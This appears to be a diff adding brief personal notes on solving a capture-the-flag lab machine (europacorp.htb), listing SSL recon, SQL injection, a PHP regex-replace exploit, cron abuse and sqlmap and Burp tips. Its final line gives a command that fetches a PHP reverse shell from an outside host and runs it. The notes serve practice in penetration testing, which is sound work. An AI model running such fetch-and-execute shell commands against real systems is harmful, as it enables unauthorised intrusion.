@@ -1,0 +1,15 @@
+Points:
+- sslscan => find alternative name
+- go to browser and click the certificate => see the issuer information => admin@europacorp.htb
+- SQLi
+- google 'php regular replace exploit'
+- cron
+
+New Tools:
+- sslscan => for https
+
+Details:
+- need many recon on ssl, which is very important.
+- if use sqlmap, use --force-ssl.
+- use burp well
+- curl http://10.10.14.19/php-reverse-shell.php | php => to execute the reverse shell
